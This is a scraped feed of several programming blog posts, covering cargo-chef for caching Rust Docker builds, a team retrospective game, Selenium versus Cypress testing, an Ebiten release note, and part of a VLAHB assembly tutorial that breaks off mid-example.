October 30, 2020 | https://www.lpalmieri.com/posts/fast-rust-docker-builds/ | <a href="https://web.archive.org/web/*/https://www.lpalmieri.com/posts/fast-rust-docker-builds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  <article>
    
      
      
<ul id="frontmatter">
    <li>
        <time datetime="2020-10-23T19:00:10.47Z">October 23, 2020</time>
    </li>
    <span></span>
    <li> 2344 words </li>
    <span></span>
    <li> 12 min </li>
</ul>

      
<p><a href="https://github.com/LukeMathWalker/cargo-chef"><code>cargo-chef</code></a> is a new <code>cargo</code> sub-command to build <em>just</em> the dependencies of your Rust project based on a JSON description file, a <em>recipe</em>.<br>
<code>cargo-chef</code> can be used to fully leverage Docker layer caching, therefore massively speeding up Docker builds for Rust projects.<br>
On our commercial codebase (~14k lines of code, ~500 dependencies) we measured a <strong>5x speed-up</strong>: we cut Docker build times <strong>from ~10 minutes to ~2 minutes</strong>.<sup><a href="#circleci">1</a></sup> </p>
<p><em><a href="https://www.lpalmieri.com/subscribe">Subscribe to the newsletter</a> to be notified when a new article is published on this blog.</em></p>

<p>Rust shines at runtime, consistently delivering great performance, but it comes at a cost: compilation times.<br>
They have been consistently among the top answers in the Rust annual survey when it comes to <a href="https://blog.rust-lang.org/2020/04/17/Rust-survey-2019.html#rust-adoption---a-closer-look"><em>the biggest challenges or problems for the Rust project</em></a>.</p>
<p>Optimised builds (<code>--release</code>), in particular, can be gruesome - up to 15/20 minutes on medium projects with several dependencies. Quite common on web development projects pulling in many foundational crates from the async ecosystem (<code>tokio</code>, <code>async-std</code>, <code>actix-web</code>, <code>tonic</code>, <code>lapin</code>, etc.).</p>
<p>How does this impact your day-to-day if you are working on a Rust project?</p>

<p><a href="https://www.docker.com/">Docker</a> containers are a mainstream technology to deploy software in production environments - most organisations have a Continuous Integration/Continuous Deployment pipeline that clones a project from a version control system (e.g. GitHub) and builds a Docker image to be deployed on top of a container orchestrator (e.g. <a href="https://kubernetes.io/">Kubernetes</a>, <a href="https://www.nomadproject.io/">Nomad</a> or other commercial solutions).</p>
<p>In a Docker build you will always be using the optimised build profile (<code>--release</code>) to get top-performance in your production environment. More often than not CI/CD pipelines do not run on top of very beefy machines - a couple of cores, maybe, not much more than that.</p>
<p>This combination is deadly.<br>
It can take more than 30 minutes to go from a merged PR to rolling out the new version to your end-users.</p>
<p>Such a long delay can have nefarious knock-on effects.</p>
<h2 id="slow-docker-builds-will-kill-you">Slow Docker builds will kill you</h2>
<p>Slow Docker builds will, over time, reduce your deployment frequency.<br>
<a href="https://www.amazon.co.uk/Accelerate-Software-Performing-Technology-Organizations/dp/1942788339">Accelerate</a> has taught you to optimise for small changes deployed multiple times a day. But if each build takes ages it is very unlikely that your engineers will be willing to go through the ordeal often.<br>
They will start batching up changes, making it much more likely than one of those deployments will result in an outage. </p>
<p>Slow Docker builds will bite you again during those outages: the speed of your CI pipeline puts a hard limit on how fast you can roll out an emergency patch to mitigate an incident ("fix forward").<br>
If it takes 20 minutes to build a Docker container then the incident will be <em>at least</em> 20 minutes long (assuming you find the right fix as soon as the incident happens - unlikely).</p>
<p>In other words - do not neglect your CI/CD pipeline. It impacts your bottom line.</p>
<blockquote>
<p>Ok, ok, you convinced me! I want fast Docker builds! How?</p>
</blockquote>

<p>Let's have a look at your typical Rust Dockerfile:</p>
<pre><code><span>FROM</span><span> rust </span><span>as </span><span>builder
</span><span>WORKDIR </span><span>app
</span><span>COPY</span><span> . .
</span><span># This works with the dummy project generated by `cargo new app --bin`
</span><span>RUN </span><span>cargo build --release --bin app

</span><span>FROM</span><span> rust </span><span>as </span><span>runtime
</span><span>WORKDIR </span><span>app
</span><span>COPY</span><span> --from=</span><span>builder</span><span> /app/target/release/app /usr/local/bin
ENTRYPOINT ["</span><span>./usr/local/bin/app</span><span>"]
</span></code></pre>
<p>It is a <a href="https://docs.docker.com/develop/develop-images/multistage-build/"><em>multi-stage</em> build</a>: we create an intermediate Docker image (<code>builder</code>) to compile our binary and then we copy that binary over to the final Docker image (<code>runtime</code>) where we actually run it.<br>
The <code>builder</code> stage often requires more dependencies (e.g. OS packages) than the runtime stage, which can be kept fairly slim leading to smaller images with minimal attack surface.</p>
<p>If you run <code>docker build -t dummy-image .</code> you will see something like this in your terminal:</p>
<pre><code><span>Sending build context to Docker daemon  41.47kB
Step 1/8 : FROM rust as builder
 ---&gt; f5fde092a1cd
Step 2/8 : WORKDIR app
 ---&gt; Using cache
 ---&gt; 53c89dd8e048
Step 3/8 : COPY . .
 ---&gt; 39bc69ee400b
Step 4/8 : RUN cargo build --release --bin app
 ---&gt; Running in 9dc66ef72185
   Compiling app v0.1.0 (/app)
    Finished release [optimized] target(s) in 0.73s
Removing intermediate container 9dc66ef72185
 ---&gt; 13b22cf28e60
Step 5/8 : FROM rust as runtime
 ---&gt; f5fde092a1cd
Step 6/8 : WORKDIR app
 ---&gt; Using cache
 ---&gt; 53c89dd8e048
Step 7/8 : COPY --from=builder /app/target/release/app /usr/local/bin
 ---&gt; f1e7055edd75
Step 8/8 : ENTRYPOINT ["./usr/local/bin/app"]
 ---&gt; Running in dc4a9dcc7cd5
Removing intermediate container dc4a9dcc7cd5
 ---&gt; e127c4129b2f
Successfully built e127c4129b2f
Successfully tagged dummy-image:latest
</span></code></pre>
<p>Each <code>RUN</code>, <code>COPY</code> and <code>ADD</code> instruction creates <a href="https://dzone.com/articles/docker-layers-explained">a <em>layer</em></a>: a diff between the previous state (the layer above) and the current state after having executed the specified command.<br>
Layers are cached.<br>
If the starting point of an operation has not changed (e.g. the base image) and the command itself has not changed (e.g. the checksum of the files copied by <code>COPY</code>) Docker does not perform any computation and directly retrieves a copy of the result from the local cache.</p>
<p>We can see it in action by running again <code>docker build -t dummy-image .</code>:</p>
<pre><code><span>Sending build context to Docker daemon  41.47kB
Step 1/8 : FROM rust as builder
 ---&gt; f5fde092a1cd
Step 2/8 : WORKDIR app
 ---&gt; Using cache
 ---&gt; 53c89dd8e048
Step 3/8 : COPY . .
 ---&gt; Using cache
 ---&gt; 39bc69ee400b
Step 4/8 : RUN cargo build --release --bin app
 ---&gt; Using cache
 ---&gt; 13b22cf28e60
Step 5/8 : FROM rust as runtime
 ---&gt; f5fde092a1cd
Step 6/8 : WORKDIR app
 ---&gt; Using cache
 ---&gt; 53c89dd8e048
Step 7/8 : COPY --from=builder /app/target/release/app /usr/local/bin
 ---&gt; Using cache
 ---&gt; f1e7055edd75
Step 8/8 : ENTRYPOINT ["./usr/local/bin/app"]
 ---&gt; Using cache
 ---&gt; e127c4129b2f
Successfully built e127c4129b2f
Successfully tagged dummy-image:latest
</span></code></pre>
<p>Notice the <code>Using cache</code> log after every single step. No output at all from <code>cargo build</code> - execution has been skipped entirely. </p>
<p>Docker layer caching is <em>fast</em> and can be leveraged to massively speed up Docker builds.<br>
The trick is optimising the order of operations in your Dockerfile: anything that refers files that are changing often (e.g. your source code) should appear as late as possible, therefore maximising the likelihood of the previous step being unchanged and allowing Docker to retrieve the result straight from the cache.</p>
<p>The expensive step is usually compilation.<br>
Most programming languages follow the same playbook: you <code>COPY</code> a lock-file of some kind first, build your dependencies, <code>COPY</code> over the rest of your source code and then build your project.<br>
This guarantees that most of the work is cached as long as your dependency tree does not change between one build and the next.</p>
<p>In a Python project, for example, you might have something along these lines:</p>
<pre><code><span>FROM</span><span> python:3
</span><span>COPY</span><span> requirements.txt
</span><span>RUN </span><span>pip install -r requirements.txt
</span><span>COPY</span><span> src/ /app
</span><span>WORKDIR </span><span>/app
CMD ["</span><span>python</span><span>", "</span><span>app</span><span>"]
</span></code></pre>
<p>What about Rust?</p>

<p><code>cargo</code>, as of today, does not provide a mechanism to build your project dependencies starting from its <code>Cargo.lock</code> file (e.g. <code>cargo build --only-deps</code>).<br>
Therefore Rust projects have always struggled to leverage Docker layer caching properly.</p>
<p>If you search for "Rust Docker cache" on Google you will bump into a variety of articles that propose a variety of workarounds.<br>
The <a href="https://stackoverflow.com/questions/58473606/cache-rust-dependencies-with-docker-build">blessed answer on StackOverflow</a>, as many other blog posts, suggests the following steps to unlock Docker layer caching for a simple project: copy the lock file, create a dummy <code>main.rs</code> file, build the project, delete the dummy file, copy over your source code, build again.</p>
<pre><code><span>FROM</span><span> rust
</span><span>WORKDIR </span><span>/var/www/app
</span><span>COPY</span><span> dummy.rs .
</span><span>COPY</span><span> Cargo.toml .
</span><span>RUN </span><span>sed -i '</span><span>s#src/main.rs#dummy.rs#</span><span>' Cargo.toml
</span><span>RUN </span><span>cargo build --release
</span><span>RUN </span><span>sed -i '</span><span>s#dummy.rs#src/main.rs#</span><span>' Cargo.toml
</span><span>COPY</span><span> . .
</span><span>RUN </span><span>cargo build --release
CMD ["</span><span>target/release/app</span><span>"]
</span></code></pre>
<p>It is a bit cumbersome but you can live with it for a simple single-binary project. You just need to keep your Dockerfile up to date every time you restructure your file structure (and book some time to explain to your colleagues what the hell you are doing).</p>
<p>As soon as your project grows in complexity (e.g. a workspace with a few crates) this "workaround" leads to an entangled mess that is painful to watch (and maintain).</p>
<p>I am currently finalising the chapter of <a href="https://zero2prod.com/">Zero To Production In Rust</a> on deployment best-practices for Rust projects - I have no intention of teaching this workaround as the best-way to get fast Docker builds with Rust.<br>
I set out to build something nicer and less error-prone.</p>

<p><a href="https://github.com/LukeMathWalker/cargo-chef"><code>cargo-chef</code></a> is a new <code>cargo</code> sub-command.<br>
You can install from <a href="https://crates.io/">crates.io</a> with</p>
<pre><code><span>cargo</span><span> install cargo-chef
</span></code></pre>
<p><code>cargo-chef</code> exposes two commands: <code>prepare</code> and <code>cook</code>:</p>
<pre><code><span>cargo</span><span> chef</span><span> --help
</span></code></pre><pre><code><span>
cargo-chef

USAGE:
    cargo chef &lt;SUBCOMMAND&gt;

SUBCOMMANDS:
    cook       Re-hydrate the minimum project skeleton identified by `cargo chef prepare` and
               build it to cache dependencies
    prepare    Analyze the current project to determine the minimum subset of files (Cargo.lock
               and Cargo.toml manifests) required to build it and cache dependencies
</span></code></pre>
<p><code>prepare</code> examines your project and builds a <em>recipe</em> that captures the set of information required to build your dependencies.</p>
<pre><code><span>cargo</span><span> chef prepare</span><span> --recipe-path</span><span> recipe.json
</span></code></pre>
<p>Nothing too mysterious going on here, you can examine the <code>recipe.json</code> file: it contains the skeleton of your project (e.g. all the <code>Cargo.toml</code> files with their relative path, the <code>Cargo.lock</code> file if available) plus a few additional pieces of information.<br>
In particular it makes sure that all libraries and binaries are explicitly declared in their respective <code>Cargo.toml</code> files even if they can be found at the canonical default location (<code>src/main.rs</code> for a binary, <code>src/lib.rs</code> for a library).</p>
<p>The <code>recipe.json</code> is the equivalent of the Python <code>requirements.txt</code> file - it is the only input required for <code>cargo chef cook</code>, the command that will build out our dependencies:</p>
<pre><code><span>cargo</span><span> chef cook</span><span> --recipe-path</span><span> recipe.json
</span></code></pre>
<p>If you want to build in <code>--release</code> mode:</p>
<pre><code><span>cargo</span><span> …</span></code></pre></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.lpalmieri.com/posts/fast-rust-docker-builds/">https://www.lpalmieri.com/posts/fast-rust-docker-builds/</a></em></p>]]>
            </description>
            <link>https://www.lpalmieri.com/posts/fast-rust-docker-builds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942601</guid>
            <pubDate>Fri, 30 Oct 2020 14:32:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The “I Suck” Awards]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942461">thread link</a>) | @mcrittenden
<br/>
October 30, 2020 | https://critter.blog/2020/10/30/the-i-suck-awards/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/10/30/the-i-suck-awards/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-2627">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>One of my favorite team retrospective activities is what I call the “I Suck” awards. </p>



<p>It’s simple. Here’s the process:</p>



<ul><li>Step 1: Someone kicks it off by saying why they suck at that moment</li><li>Step 2: The rest of the team laughs or empathizes or whatever the situation calls for</li><li>Step 3: Repeat steps 1 and 2 until everyone has said why they suck</li><li>Step 4: Vote on the winner of the “I Suck” award, aka the person with the most impressive suckitude that time around. </li></ul>



<p>Everyone sucks for some reason at any given time. Maybe they procrastinated. Maybe they missed an obvious bug. Maybe they keep forgetting to update the sprint board. Maybe they have been talking too much on calls. Maybe they didn’t submit their dang timesheet. Whatever it is, everyone has one.</p>



<p>There are a few reasons why I love this activity:</p>



<ul><li>It’s fun and often hilarious</li><li>It discourages <a href="https://en.wikipedia.org/wiki/Cover_your_ass">Cover Your Ass (CYA)</a> Engineering</li><li>It gives people a chance to drop some tips for next time</li><li>It’s great for <a href="https://critter.blog/2016/10/27/the-whys-and-hows-of-jelling-teams/">team jelling</a> </li><li>It lets us learn from each other’s mistakes</li><li>It reduces the sense of <a href="https://critter.blog/2020/10/26/you-cant-fail-at-experiments/">shame that accompanies messing up</a></li></ul>



<p>I stole the idea from Radical Candor, which calls it the “<a href="https://www.radicalcandor.com/encourage-feedback/#:~:text=Introduce%20Whoops-a-Daisy">Whoops-A-Daisy</a>“. </p>



<p>It’s powerful and it’s fun, so give it a shot! Why do you suck?</p>





		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://critter.blog/2020/10/30/the-i-suck-awards/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942461</guid>
            <pubDate>Fri, 30 Oct 2020 14:20:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Automated End-to-End Testing with Selenium and Cypress.io]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942411">thread link</a>) | @thinkcru
<br/>
October 30, 2020 | https://thinkcru.com/blog/end-to-end-testing-with-selenium-and-cypress-io/ | <a href="https://web.archive.org/web/*/https://thinkcru.com/blog/end-to-end-testing-with-selenium-and-cypress-io/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
              <p>At <a href="https://thinkcru.com/">ThinkCru </a>building stable applications that are well tested is our #1 priority. &nbsp;At first pass, we do Quality Assurance (QA) testing manually to ensure we are initially meeting our client's requirements. &nbsp;However, at some point, as the application grows in complexity, manual testing is no longer sustainable. &nbsp;In order to scale up testing as new features are added we deploy <em>automated </em>end-to-end (e2e) testing for using both Selenium and Cypress frameworks. &nbsp;</p><h2 id="key-differences">Key Differences</h2><p>The purpose of this post is to explore some of the key differences between the Selenium and Cypress frameworks. &nbsp;Bellow is just a brief comparison</p><!--kg-card-begin: html--><div>
<table>
  <tbody><tr>
    <th scope="col">Framework</th>
    <th scope="col">Selenium WebDriver</th>
    <th scope="col">Cypress.io</th>
  </tr>
  <tr>
    <td>Supported Languages</td>
    <td>Java, C#, Java Script, Python, Ruby, Onjective-C</td>
    <td>Java Script</td>
  </tr>
  <tr>
    <td>Framework supported</td>
    <td>Supports multiple frameworks based on specific programming languages. (For e.g: JUnit for Java, Cucumber for JavaScript, etc.) </td>
    <td>Supports only Mocha JS</td>
  </tr>
  <tr>
    <td>Browsers Supported</td>
    <td>Chrome, IE, Safari Edge, Firefox, Opera</td>
    <td>Chrome, Edge, Firefox Electron</td>
  </tr>    
  <tr>
    <td>Issues in GitHub</td>
    <td>Open - 287, Closed - 6513</td>
    <td>Open - 1295, Closed - 5196</td>
  </tr>
<tr>
    <td>iFrame Support</td>
    <td>Yes</td>
    <td>No</td>
  </tr>
</tbody></table>
</div>
<!--kg-card-end: html--><hr><h2 id="selenium">Selenium</h2><h3 id="how-selenium-works">How Selenium works?</h3><p>Selenium is driven by a variety of languages (Java, C#, Java Script, Python, Ruby, Objective-C) using an API that communicates with the <code>WebDriver</code> binary.</p><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/Selenium-WebDriver-for-Automation-Testing-1-.jpg" alt=""><figcaption>Curtesy of Browserstack.com</figcaption></figure><ol><li>Using the API, the Selenium commands creates an HTTP Request for each Selenium command and sends it to the browser driver.</li><li>An HTTP request is then sent to the server using a specific Browser Driver (Chrome Driver, Firefox Driver, IE Driver, MS Edge Driver, etc).</li><li>Then the steps are executed on the HTTP server.</li><li>The execution status is sent to the HTTP server which is then captured by the Selenium script.</li></ol><h3 id="advantages-of-selenium">Advantages of Selenium</h3><ol><li>Robust community, multiple bindings, and allows engineers to use best practices</li><li>Mobile testing support</li><li>Compared to Cypress, Selenium can work with iFrame elements and browser tabs</li></ol><h3 id="limitations-of-selenium">Limitations of Selenium</h3><ol><li>No built-in command for automatic generation of test results.</li><li>Handling page load or element load is difficult.</li><li>Creating test cases is time-consuming as compared to Cypress</li><li>Difficult to set up test environment as compared to Cypress</li></ol><h3 id="multiple-tabs">Multiple Tabs</h3><p>To work with browser you should get an array of your tabs and select one:</p><pre><code>WebDriver driver = new ChromeDriver();

ArrayList&lt;String&gt; tabs = new ArrayList&lt;String&gt;
(driver.getWindowHandles());
driver.switchTo().window(tabs.get(1));</code></pre><h3 id="iframes">iFrames</h3><p>Selenium purpose 3 methods to enter into iFrame:</p><pre><code>driver.switchTo().frame(0);
driver.switchTo().frame("frameName");
driver.switchTo().frame(webElement);</code></pre><p>Now you are able to work with html elements into selected iFrame. Also you can enter into new iFrame if it's located into entered iFrame.</p><p>But there is only one way to get out from iFrame:</p><pre><code>driver.switchTo().defaultContent();</code></pre><hr><h2 id="cypress">Cypress</h2><h3 id="how-cypress-works">How Cypress works?</h3><p>Cypress developers created a new architecture from the ground up. Whereas Selenium executes remote commands through the network, Cypress runs in the same run-loop as your application. Behind Cypress is a Node.js server process. Cypress and the Node.js process constantly communicate, synchronize, and perform tasks on behalf of each other. Having access to both parts (front and back) gives us the ability to respond to your application's events in real time, while at the same time work outside of the browser for tasks that require a higher privilege.</p><h3 id="advantages-of-cypress">Advantages of Cypress</h3><ol><li>Easy to setup and start</li><li>Good documentation and code samples</li><li>Cypress captures snapshots at the time of test execution. This allows QAs or developers to hover over a specific command in the Command Log to see exactly what happened at that particular step. See more <a href="https://docs.cypress.io/guides/core-concepts/test-runner.html">https://docs.cypress.io/guides/core-concepts/test-runner.html</a></li><li>One doesn’t need to add explicit or implicit wait commands in test scripts, unlike Selenium. Cypress waits automatically for commands and assertions.</li><li>As the programmer writes commands, Cypress executes them in real-time, providing visual feedback as they run.</li></ol><h3 id="limitations-of-cypress">Limitations of Cypress</h3><ol><li>One cannot use Cypress to drive two browsers at the same time</li><li>It doesn’t provide support for multi-tabs</li><li>Cypress doesn’t provide support for browsers like Safari and IE at the moment</li><li>Limited support for iFrames. See <a href="https://www.cypress.io/blog/2020/02/12/working-with-iframes-in-cypress/">https://www.cypress.io/blog/2020/02/12/working-with-iframes-in-cypress/</a></li></ol><h2 id="coding">Coding</h2><h3 id="example-test-case-">Example Test Case:</h3><ol><li>Clone the example repo <code><a>git clone git@github.com</a>:thinkcru/selenium-test-project.git</code></li><li>Open <a href="https://www.xe.com/">https://www.xe.com/</a></li><li>Enter '100' in the Amount field</li><li>Click the 'Convert' button</li><li>Check that convert result more than '84'</li></ol><h3 id="selenium-java-project">Selenium (Java) Project</h3><ol><li>Download and install JDK (<a href="https://www.oracle.com/java/technologies/javase-downloads.html">https://www.oracle.com/java/technologies/javase-downloads.html</a>)</li><li>Download and install IDE (f.e. IntelliJ IDEA <a href="https://www.jetbrains.com/idea/download">https://www.jetbrains.com/idea/download</a>)</li><li>Open IDE and create a project</li></ol><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_19h21_55.png" alt=""></figure><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_19h22_14.png" alt=""></figure><p>4. &nbsp; By default <code>pom.xml</code> file doesn't contain any dependencies. For our example we will need some dependencies (Selenium, WebDriverManager, TestNG). See more maven dependencies on <a href="https://mvnrepository.com/">https://mvnrepository.com/</a></p><!--kg-card-begin: html--><!--kg-card-end: html--><p>5. &nbsp; Create a package and java class</p><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_19h51_01.png" alt=""></figure><p>6. &nbsp; For now you need to initialize WebDriver. There are two ways to do it: manually download WebDriver for a browser or use WebDriverManager (<a href="https://github.com/bonigarcia/webdrivermanager">https://github.com/bonigarcia/webdrivermanager</a>). To use WebDriverManager you need to add a dependency to pom.xml file.</p><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_19h52_02.png" alt=""><figcaption>WebDriver initialization without WebDriverMaganer</figcaption></figure><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_19h53_10.png" alt=""><figcaption>WebDriver initialization with WebDriverMaganer</figcaption></figure><p>7. &nbsp; The following code example is how to implement the <code>chromeDriver()</code> to send an input with the amount of <code>100</code> into the text field. &nbsp;The driver will then <code>click()</code> on the button associated with form submission. &nbsp;An assertion <code>assertTrue()</code> will wait for the text to resolve the amount to <code>84.0</code>.</p><!--kg-card-begin: html--><!--kg-card-end: html--><hr><h3 id="cypress-project">Cypress project</h3><ol><li>Clone the example project from the repo <code>git clone <a>git@github.com</a>:thinkcru/cypress-io-test-project.git</code></li><li>Download Node.js (<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a>)</li><li>Download IDE: WebStorm or Visual Studio Code. I will user VSC in this example.</li><li>Create a folder for Cypress project</li><li>Open the folder in cmd and run the following command to install Cypress</li></ol><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_20h45_26.png" alt=""></figure><p>5. &nbsp; Add <code>package.json</code> file to open Cypress. Now we can open Cypress by clicking <code>cypress:open</code></p><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_20h51_47.png" alt=""></figure><p>6. &nbsp; Click <code>cypress:open</code> to open Cypress. After the first launch test examples will be generated</p><figure><img src="https://d3zuzi8ryktad.cloudfront.net/ghost/2020/10/2020-10-26_21h00_44.png" alt=""></figure><p>7. &nbsp; &nbsp;Create a folder in <code>cypress/integration/</code> and <code>spec.js</code> file</p><p>8. &nbsp; &nbsp;Create the example code and is quick and easy to implement the tests much like how a Unit Test is written. &nbsp;In about 4 lines of code we can use the <code>cy</code> library to add the amount and invoke an expectation from what is returned in the browser.</p><!--kg-card-begin: html--><!--kg-card-end: html--><h2 id="conclusion">Conclusion</h2><p>Cypress and Selenium serve a similar purpose that is achieved in two different ways. A key difference is that Cypress ideal for introducing developers to test automation rather than just a replacement for Selenium. This is why Cypress is among the fastest-growing automation tools in the world. On the other hand, Selenium is a more general-purpose tool targeted at a broader audience.</p><p>Needless to say, prior to choosing an automation tool, one must weigh the pros and cons of every option. &nbsp; If you are a beginner and are comfortable with Javascript then Cypress may be a good option. &nbsp;On the other hand, if you have more complex needs, Selenium may be worth to try at first if loading up the driver is not too much effort.</p><p>Another thing to keep in mind is that if you look at how Cypress is built, it is largely a unit testing tool that is ideal for Javascript-focused development teams. Once you stray from these details and your team decides to experiment with other methods of test automation, you’ll find that Selenium can better accommodate those growing pains.</p>
            </div>
          </div></div>]]>
            </description>
            <link>https://thinkcru.com/blog/end-to-end-testing-with-selenium-and-cypress-io/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942411</guid>
            <pubDate>Fri, 30 Oct 2020 14:16:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Golang game engine v2 released]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24942250">thread link</a>) | @nargella
<br/>
October 30, 2020 | https://ebiten.org/blog/v2.0.0.html | <a href="https://web.archive.org/web/*/https://ebiten.org/blog/v2.0.0.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p lang="en">We are very happy to announce the release of v2.0.0 (<a href="https://ebiten.org/documents/2.0.html">Release Note</a>).</p>
    <p lang="ja">v2.0.0 がリリースされました! 詳しくは<a href="https://ebiten.org/documents/2.0.html">リリースノート</a>を参照してください。</p>
    <p lang="en">I appreciate all the contributors and <a href="https://github.com/sponsors/hajimehoshi">all the sponsors</a>. Thank you very much!</p>
    <p lang="ja">すべてのコントリビューターと<a href="https://github.com/sponsors/hajimehoshi">スポンサーの皆様</a>に感謝いたします。どうもありがとうございます!</p>
    <p lang="en">v2.0 doesn't have any new features. The features are same as v1.12. As there are breaking changes in the API, please refer <a href="https://ebiten.org/documents/to_v2.html">Ebiten 2.0 migration guide</a> for the details.</p>
    <p lang="ja">v2.0 には新機能が一切ありません。機能的には v1.12 と同等です。 API の破壊的変更がありますので、詳しくは「<a href="https://ebiten.org/documents/to_v2.html">Ebiten 2.0 移行ガイド</a>」を参照してください。</p>
    <p lang="en">The master branch has already been v2.1. Only bug fixes will be merged to v2.0 and v1.12. We plan to release v2.1.0 in March 2021. After releasing v2.1.0, v1.12 will no longer be maintained.</p>
    <p lang="ja">master ブランチはすでに v2.1 となっています。 v2.0 と v1.12 は今後バグ修正のみが入ります。 v2.1.0 のリリースは 2021 年 3 月頃の予定です。 v2.1.0 のリリース後、 v1.12 はメンテされなくなる予定です。</p>
    <p lang="en">Enjoy!</p>
  </div></div>]]>
            </description>
            <link>https://ebiten.org/blog/v2.0.0.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942250</guid>
            <pubDate>Fri, 30 Oct 2020 14:01:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Make your own PONG in Assembly]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942137">thread link</a>) | @akully
<br/>
October 30, 2020 | http://adamkulidjian.com/vlahb.html | <a href="https://web.archive.org/web/*/http://adamkulidjian.com/vlahb.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    

    <p>Nov 13, 2019 - <a href="https://github.com/Kully/VLAHB">Github Link</a></p>

    <div>
        <p><img src="http://adamkulidjian.com/imgs/conway2.gif">
        </p>
        <p><img src="http://adamkulidjian.com/imgs/pong2.gif">
        </p>
    </div>

    <br>

    <h2>Scope of Blog</h2>

    <p>To provide a very simple overview of the assembly programming language in <a href="https://github.com/Kully/VLAHB">VLAHB</a> and assembly programming principles in general. Machine code and opcodes is beyond the scope of this blog post.</p>

    <h2>The Brains of the Operation</h2>

    <p>A <b>virtual machine</b> ("vm") acts like a real computer but it only exists within software and not hardware. This means that a virtual machine is not made of physical pieces of etched silicon, printed circuit boards, transistors or capacitors or anything like that. Instead it is "virtual" which means that we program this computer ourselves to do what want: to read and execute binary files according to a blueprint we give it.</p>

    <p>Checkout the file called <a href="https://github.com/Kully/VLAHB/blob/master/vm.c#L142-L571">vm.c</a> in <b>VLAHB</b>. See the <b>switch</b> statement and all the <b>case</b> lines? This is code that tells the virtual machine that if it sees an instruction <b>0x0001</b>, do <b>X</b>. If it sees <b>0x0002</b>, do <b>Y</b>, and so on and so forth.</p>


    <h2>Assembly to Binary</h2>

    <p><b>VLAHB</b> is a vm together with an assembly language - let's call it <b>VASM</b> - and an assembler (<i>assembler.py</i>) which converts assembly files (<i>file.asm</i>) to raw machine code (<i>file.bin</i>) that our vm can read and execute.</p>

    <p><img src="http://adamkulidjian.com/imgs/asm_hex_bin_thinarrow.png"></p><p>The process of turning file.asm to file.bin is called <b>assembling</b>.</p>

    <p>Our vm features a special integer called a <b>program counter</b> ("pc") which keeps track of what line the vm is reading at a time. When you tell the vm to run the program <i>myFile.bin</i>, the <b>pc</b> value is assigned to the line number of the program that the vm will begin "reading" (think Turing Machine). The pc is set to this value and then...</p>

    <ul>
        <li>vm reads instruction</li>
        <li>vm executes instruction</li>
        <li><i>pc increments</i></li>
        <li>vm reads instruction</li>
        <li>vm executes instruction</li>
        <li><i>pc increments</i></li>
        ... and so on
    </ul>
    <p>Nothing is inherently special about these cryptic codes. <b>1002 0003 0000 fde8</b> has no inherent meaning but the vm reads and knows to load the literal 65000 into ram at index 4098.</p>

    <h2>RAM</h2>

    <p>There is a list called <b>ram</b> stored in our virtual machine <a href="https://github.com/Kully/VLAHB/blob/master/vm.c">vm.c</a>. It contains 65535 0's. Each slot of ram holds an integer from 0 to 4294967295. By changing the values in our ram slots we can get super mario to run across the screen, create a paint application, or solve world peace.</p>

    <pre><code>// Empty brackets <b>[ ]</b> represent <b>0</b>
ram := [ ][ ][ ][ ][ ][ ][ ][ ]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 </code></pre>

    

    <p><b>Ram Slot Dedication:</b> this represents how our ram slot are organized

    </p><pre><code>[-----------] [-------] [--] [---------] [---------------------------]
0       4095  4096 4099 4100 4101  27140 27141                   65535 
</code></pre>

    <table>
        <tbody><tr>
            <th>slots in ram</th>
            <th>what they do</th>
        </tr>
        <tr>
            <td>0-4095</td>
            <td>function inputs</td>
        </tr>
        <tr>
            <td>4096-4099</td>
            <td>4 pointers (U,V,Y,Z resp.)</td>
        </tr>
        <tr>
            <td>4100</td>
            <td>return slot for function outputs</td>
        </tr>
        <tr>
            <td>4101-27140</td>
            <td>vram</td>
        </tr>
        <tr>
            <td>27141-65535</td>
            <td>free space</td>
        </tr>
    </tbody></table>

    <h2>Simple Operations</h2>

    <p>The simplest operation to perform on ram is a direct load. This loads a value into a slot of ram.</p>

    <p>
    <b> Ex. 1 </b></p><pre><code>LD R[3] 2  // load 2 into the slot of ram at index 3
</code></pre>

    <pre><code>
